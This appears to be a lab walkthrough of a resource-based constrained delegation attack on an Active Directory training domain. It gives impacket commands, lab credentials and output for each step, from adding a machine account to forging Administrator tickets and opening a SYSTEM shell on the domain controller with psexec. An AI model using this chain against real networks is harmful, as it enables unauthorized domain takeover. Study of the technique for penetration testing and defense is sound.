# RBCD from Linux

## Linux

- First, we need to create a computer account, which is possible because **ms-DS-MachineAccountQuota** is set to 10 by default for authenticated users. The [addcomputer.py](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py) script from impacket can be used for this.


- Authenticate to 10.129.208.188 with 

- user "carole.holmes"

- password "Y3t4n0th3rP4ssw0rd" 

## Creating a New Computer

	> impacket-addcomputer -computer-name 'Jesta$' -computer-pass Griffin1 -dc-ip 10.129.208.188 inlanefreight.local/carole.holmes:Y3t4n0th3rP4ssw0rd

	> impacket-addcomputer -computer-name 'Jesta$' -computer-pass Griffin1 -dc-ip 10.129.208.188 inlanefreight.local/carole.holmes:Y3t4n0th3rP4ssw0rd
	Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - forked by ThePorgs

	[*] Successfully added machine account Jesta$ with password Griffin1. 
	
- **Note:** We can use BloodHound.py to enumerate the domain, searching for privileges to abuse for RBCD from Linux. 

- Then, we need to add this account to the targeted computer's trust list, which is possible because **carole.holmes has GenericAll ACL** on this computer. We can use the [rbcd.py](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py) Python script to do so. 

### Use the rbcd Python Script 
	
	> python3 rbcd.py -dc-ip 10.129.208.188 -t DC01 -f Jesta inlanefreight\\carole.holmes:Y3t4n0th3rP4ssw0rd
	Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - forked by ThePorgs

	[*] Starting Resource Based Constrained Delegation Attack against DC01$
	[*] Initializing LDAP connection to 10.129.208.188
	[*] Using inlanefreight\carole.holmes account with password ***
	[*] LDAP bind OK
	[*] Initializing domainDumper()
	[*] Initializing LDAPAttack()
	[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `Jesta` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `DC01`
	[*] Delegation rights modified succesfully!
	[*] Jesta$ can now impersonate users on DC01$ via S4U2Proxy
	
- We can ask for a TGT for the created computer account, followed by a **S4U2Self** request to get a forwardable TGS ticket, and then a **S4U2Proxy** request to get a valid TGS ticket for a specific SPN on the targeted computer.

	> getST.py -spn cifs/DC01.inlanefreight.local -impersonate Administrator -dc-ip 10.129.208.188 inlanefreigh
	t.local/Jesta:Griffin1
	Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - forked by ThePorgs

	[-] CCache file is not found. Skipping...
	[*] Getting TGT for user
	[*] Impersonating Administrator
	[*] Requesting S4U2self
	[*] Requesting S4U2Proxy
	[*] Saving ticket in Administrator@cifs_DC01.inlanefreight.local@INLANEFREIGHT.LOCAL.ccache
	
	
- We then will use this TGS ticket by exporting the ticket's path to the KRB5CCNAME environment variable.


## Add the Ticket to KRB5CCNAME 

	> export KRB5CCNAME=Administrator@cifs_DC01.inlanefreight.local@INLANEFREIGHT.LOCAL.ccache
	
- Then you can use any impacket tool with this ticket, such as psexec.py, to get a remote shell as SYSTEM.


## Connect as Administrator 

		> psexec.py -k -no-pass dc01.inlanefreight.local                                                        
		Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - forked by ThePorgs

		[*] Requesting shares on dc01.inlanefreight.local.....
		[*] Found writable share ADMIN$
		[*] Uploading file JrbGvlWA.exe
		[*] Opening SVCManager on dc01.inlanefreight.local.....
		[*] Creating service vuku on dc01.inlanefreight.local.....
		[*] Starting service vuku.....
		[!] Press help for extra shell commands
		Microsoft Windows [Version 10.0.17763.2628]
		(c) 2018 Microsoft Corporation. All rights reserved.

		C:\Windows\system32> whoami
		nt authority\system

		C:\Windows\system32>
		

